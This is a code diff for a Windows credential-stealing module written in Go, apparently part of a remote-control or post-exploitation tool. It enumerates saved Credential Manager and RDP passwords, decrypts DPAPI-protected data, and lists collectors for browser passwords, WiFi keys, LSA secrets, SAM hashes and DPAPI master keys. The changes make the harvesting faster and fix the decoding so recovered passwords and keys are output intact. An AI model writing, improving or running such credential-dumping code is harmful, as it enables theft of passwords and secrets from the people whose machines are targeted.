+//   - CredEnumerateW 一次系统调用就是主要成本：凭据库枚举 + 每条 blob 的解封都在
+//     系统侧完成，我们无法在不丢字段的前提下把它拆小；
+//   - 逐条后处理（UTF-16 转码、blob 为空的 domain_password 再走一次 CredReadW）现在
+//     并发执行（上限 rdpWorkerLimit=4），成本被压到毫秒级。
+//
+// 因此这里**保留 Filter=nil**（枚举全部类型）：把 Filter 收窄成 "TERMSRV/*" 只能
+// 少看、不会省时，还会丢掉 generic / domain 类条目 —— 不为"看起来快"砍字段。
+// 收窄与否的实测数据见交付报告。
 func dumpRDPCredentials() ([]map[string]string, error) {
-	var results []map[string]string
+	rdpTimingStats.reset()
+	started := time.Now()
 
 	// 枚举所有凭据
 	var count uint32
 	var credsPtr uintptr
 
+	enumStart := time.Now()
 	ret, _, callErr := procCredEnumerateW.Call(
-		0, // 不使用过滤器
+		0, // 不使用过滤器（见函数注释：收窄 Filter 只丢字段，不省时）
 		0, // 枚举所有
 		uintptr(unsafe.Pointer(&count)),
 		uintptr(unsafe.Pointer(&credsPtr)),
 	)
+	rdpTimingStats.set("cred_enumerate_ms", time.Since(enumStart).Milliseconds())
 
 	if ret == 0 {
 		// ERROR_NOT_FOUND = 目标机上没有已保存凭据：这是"0 条"，不是错误
 		// （旧实现把它当失败，界面会显示一条误导性的"RDP凭据收集失败"）。
 		if callErr == windows.ERROR_NOT_FOUND {
+			rdpTimingStats.set("items", 0)
+			rdpTimingStats.set("total_ms", time.Since(started).Milliseconds())
 			return []map[string]string{}, nil
 		}
 		return nil, fmt.Errorf("CredEnumerateW 失败: %v", callErr)
@@ -537,63 +849,105 @@ func dumpRDPCredentials() ([]map[string]string, error) {
 		creds[i] = (*CREDENTIAL_W)(unsafe.Pointer(*slot))
 	}
 
-	for _, cred := range creds {
+	// 逐条处理（并发上限 rdpWorkerLimit）：结果按原下标回填，输出顺序与系统一致。
+	entries := make([]map[string]string, count)
+	var readNS int64
+	var wg sync.WaitGroup
+	sem := make(chan struct{}, rdpWorkerLimit)
+	itemStart := time.Now()
+	for i := uint32(0); i < count; i++ {
+		cred := creds[i]
 		if cred == nil {
 			continue
 		}
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(idx uint32, c *CREDENTIAL_W) {
+			defer wg.Done()
+			defer func() { <-sem }()
+			t0 := time.Now()
+			entries[idx] = buildRDPEntry(c)
+			atomic.AddInt64(&readNS, time.Since(t0).Nanoseconds())
+		}(i, cred)
+	}
+	wg.Wait()
 
-		targetName := windows.UTF16PtrToString(cred.TargetName)
-		userName := ""
-		if cred.UserName != nil {
-			userName = windows.UTF16PtrToString(cred.UserName)
+	rdpTimingStats.set("items", int64(count))
+	rdpTimingStats.set("item_process_ms", time.Since(itemStart).Milliseconds())
+	rdpTimingStats.set("cred_read_sum_ms", atomic.LoadInt64(&readNS)/int64(time.Millisecond))
+	rdpTimingStats.set("total_ms", time.Since(started).Milliseconds())
+
+	results := make([]map[string]string, 0, len(entries))
+	for _, e := range entries {
+		if e != nil {
+			results = append(results, e)
 		}
+	}
+	return results, nil
+}
 
-		// 提取密码（凭据数据）
-		password := ""
-		if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
-			blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
-			password = string(blob)
-		}
-
-		// 过滤 RDP 相关凭据
-		// RDP 凭据通常 TargetName 包含 "TERMSRV/" 或 "MicrosoftOffice"
-		isRDP := strings.HasPrefix(targetName, "TERMSRV/") ||
-			strings.Contains(targetName, "RDP") ||
-			strings.Contains(targetName, "Remote") ||
-			(cred.Type == CRED_TYPE_GENERIC && strings.Contains(targetName, "/"))
-
-		credType := "unknown"
-		switch cred.Type {
-		case CRED_TYPE_GENERIC:
-			credType = "generic"
-		case CRED_TYPE_DOMAIN_PASSWORD:
-			credType = "domain_password"
-		case CRED_TYPE_DOMAIN_CERTIFICATE:
-			credType = "domain_certificate"
-		case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
-			credType = "domain_visible_password"
-		}
-
-		entry := map[string]string{
-			"type":        credType,
-			"target_name": targetName,
-			"username":    userName,
-			"password":    password,
-			"is_rdp":      fmt.Sprintf("%v", isRDP),
-		}
-
-		// 对于 DOMAIN_PASSWORD 类型凭据，凭据数据是加密的，需要通过 CredReadW 读取
-		if credType == "domain_password" && password == "" {
-			domainCred, err := readCredentialW(targetName, CRED_TYPE_DOMAIN_PASSWORD)
-			if err == nil {
-				entry["password"] = domainCred
-			}
-		}
-
-		results = append(results, entry)
+// buildRDPEntry 把一条 CREDENTIAL_W 转成结果条目（被 dumpRDPCredentials 并发调用；
+// 只读 cred 指向的内存，不释放 —— 释放由 CredFree 在全部 goroutine 结束后统一做）。
+func buildRDPEntry(cred *CREDENTIAL_W) map[string]string {
+	targetName := windows.UTF16PtrToString(cred.TargetName)
+	userName := ""
+	if cred.UserName != nil {
+		userName = windows.UTF16PtrToString(cred.UserName)
 	}
 
-	return results, nil
+	// CredentialBlob：domain_password 是 UTF-16LE 口令，generic 可能是任意字节。
+	// 旧实现直接 string(blob)，UTF-16 的 0 字节会被塞进 JSON（"p\u0000a\u0000…"），
+	// 看起来就是一串乱码。这里统一走 decodeCredentialBlob 判定。
+	password := ""
+	if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
+		blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
+		password = decodeCredentialBlob(blob)
+	}
+
+	// RDP 凭据通常 TargetName 包含 "TERMSRV/" 或 "MicrosoftOffice"
+	isRDP := strings.HasPrefix(targetName, "TERMSRV/") ||
+		strings.Contains(targetName, "RDP") ||
+		strings.Contains(targetName, "Remote") ||
+		(cred.Type == CRED_TYPE_GENERIC && strings.Contains(targetName, "/"))
+
+	credType := "unknown"
+	switch cred.Type {
+	case CRED_TYPE_GENERIC:
+		credType = "generic"
+	case CRED_TYPE_DOMAIN_PASSWORD:
+		credType = "domain_password"
+	case CRED_TYPE_DOMAIN_CERTIFICATE:
+		credType = "domain_certificate"
+	case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
+		credType = "domain_visible_password"
+	}
+
+	entry := map[string]string{
+		"type":        credType,
+		"target_name": targetName,
+		"username":    userName,
+		"password":    password,
+		"is_rdp":      fmt.Sprintf("%v", isRDP),
+	}
+
+	// 少数场景 CredEnumerateW 不给 blob，此时用 CredReadW 再取一次
+	if credType == "domain_password" && password == "" {
+		if domainCred, err := readCredentialW(targetName, CRED_TYPE_DOMAIN_PASSWORD); err == nil {
+			entry["password"] = domainCred
+		}
+	}
+
+	return entry
+}
+
+// decodeCredentialBlob 把凭据 blob 转成可展示文本：UTF-16LE（domain_password 常见）
+// 优先，其次 UTF-8；两者都不成立返回空串（不输出二进制垃圾）。
+func decodeCredentialBlob(blob []byte) string {
+	s, ok := decodeTextBlob(blob)
+	if !ok {
+		return ""
+	}
+	return s
 }
 
 // readCredentialW 读取特定凭据
@@ -619,7 +973,7 @@ func readCredentialW(targetName string, credType uint32) (string, error) {
 	cred := *(*CREDENTIAL_W)(unsafe.Pointer(credPtr))
 	if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
 		blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
-		return string(blob), nil
+		return decodeCredentialBlob(blob), nil
 	}
 
 	return "", fmt.Errorf("no credential data")
@@ -636,42 +990,46 @@ type cryptDataBlob struct {
 	pbData *byte
 }
 
-// decryptDPAPI 使用 CryptUnprotectData 解密 DPAPI 加密数据
-func decryptDPAPI(encryptedData []byte) (string, error) {
+// procLocalFree LocalFree：CryptUnprotectData 的输出缓冲区必须用 LocalFree 释放。
+var procLocalFree = resolveAPI("kernel32.dll", "LocalFree")
+
+// CRYPTPROTECT_UI_FORBIDDEN：非交互进程里绝不允许弹 DPAPI 提示框
+// （否则凭据任务会卡在"等用户点确认"上，耗时不可控）。
+const cryptProtectUIForbidden = 0x1
+
+// decryptDPAPI 使用 CryptUnprotectData 解密 DPAPI 数据，返回**原始字节**。
+//
+// 返回 []byte 而不是 string 是关键：v10/v11 的 32 字节 AES 密钥或二进制口令里
+// 出现 0x00 时，string 化会静默截断（旧实现就是这样把主密钥毁掉的）。
+func decryptDPAPI(encryptedData []byte) ([]byte, error) {
+	if len(encryptedData) == 0 {
+		return nil, fmt.Errorf("空的 DPAPI 数据")
+	}
 	var dataIn dataBlob
 	dataIn.cbData = uint32(len(encryptedData))
-	if len(encryptedData) > 0 {
-		dataIn.pbData = &encryptedData[0]
-	}
+	dataIn.pbData = &encryptedData[0]
 
 	var dataOut cryptDataBlob
-
-	ret, _, _ := procCryptUnprotectData.Call(
+	ret, _, callErr := procCryptUnprotectData.Call(
 		uintptr(unsafe.Pointer(&dataIn)),
-		0,
-		0,
-		0,
-		0,
-		0, // CRYPTPROTECT_UI_FORBIDDEN = 0
+		0, // ppszDataDescr
+		0, // pOptionalEntropy
+		0, // pvReserved
+		0, // pPromptStruct
+		uintptr(cryptProtectUIForbidden),
 		uintptr(unsafe.Pointer(&dataOut)),
 	)
-
 	if ret == 0 {
-		return "", fmt.Errorf("CryptUnprotectData 失败")
+		return nil, fmt.Errorf("CryptUnprotectData 失败: %v", callErr)
 	}
-
-	if dataOut.pbData != nil && dataOut.cbData > 0 {
-		plain := unsafe.Slice(dataOut.pbData, dataOut.cbData)
-		result := string(plain)
-
-		// 使用 LocalFree 释放内存
-		procLocalFree := resolveAPI("kernel32.dll", "LocalFree")
-		procLocalFree.Call(uintptr(unsafe.Pointer(dataOut.pbData)))
-
-		return result, nil
+	if dataOut.pbData == nil || dataOut.cbData == 0 {
+		return nil, fmt.Errorf("CryptUnprotectData 返回空结果")
 	}
-
-	return "", fmt.Errorf("decryption returned empty result")
+	// 先复制再 LocalFree：pbData 指向系统分配的缓冲区。
+	out := make([]byte, dataOut.cbData)
+	copy(out, unsafe.Slice(dataOut.pbData, dataOut.cbData))
+	procLocalFree.Call(uintptr(unsafe.Pointer(dataOut.pbData)))
+	return out, nil
 }
 
 // copyFile 复制文件
@@ -876,14 +1234,23 @@ type credentialsCollector struct {
 	// "需要管理员权限"文案，而不是一个空段/空串。
 	adminOnly bool
 	run       func() ([]map[string]string, error)
+	// extra 往该段里补统计/计时字段（browser 的 stats、rdp 的 timings）。
+	// 为 nil 表示该段没有额外信息。
+	extra func(seg map[string]interface{})
 }
 
 // credentialsCollectors 全部收集器（顺序即 all 的输出顺序）。
 func credentialsCollectors() []credentialsCollector {
 	return []credentialsCollector{
-		{action: "browser", label: "浏览器密码", run: dumpBrowserPasswords},
+		{
+			action: "browser", label: "浏览器密码", run: dumpBrowserPasswords,
+			extra: func(seg map[string]interface{}) { seg["stats"] = browserStats.snapshot() },
+		},
 		{action: "wifi", label: "WiFi 密码", run: dumpSavedWiFi},
-		{action: "rdp", label: "RDP / 凭据管理器", run: dumpRDPCredentials},
+		{
+			action: "rdp", label: "RDP / 凭据管理器", run: dumpRDPCredentials,
+			extra: func(seg map[string]interface{}) { seg["timings"] = rdpTimingStats.snapshot() },
+		},
 		{action: "lsa", label: "LSA Secrets", adminOnly: true, run: dumpLSASecrets},
 		{action: "sam", label: "SAM 哈希", adminOnly: true, run: dumpSAM},
 		{action: "dpapi", label: "DPAPI 主密钥", run: dumpDPAPIKeys},
@@ -1008,8 +1375,15 @@ func handleCredentials(action string) (string, int32, string) {
 	firstErr := ""
 
 	for _, c := range selected {
+		segStart := time.Now()
 		results, err := c.run()
 		seg := credentialsSegment(c, results, err, elevated)
+		// 每段各自的耗时：用户要的是"RDP 那一段用了多少 ms"，而不是 all 的总耗时
+		// （总耗时里还混着浏览器/凭据库/注册表的钱）。
+		seg["duration_ms"] = time.Since(segStart).Milliseconds()
+		if c.extra != nil {
+			c.extra(seg)
+		}
 		out[c.action] = seg
 		if n, ok := seg["count"].(int); ok {
 			total += n
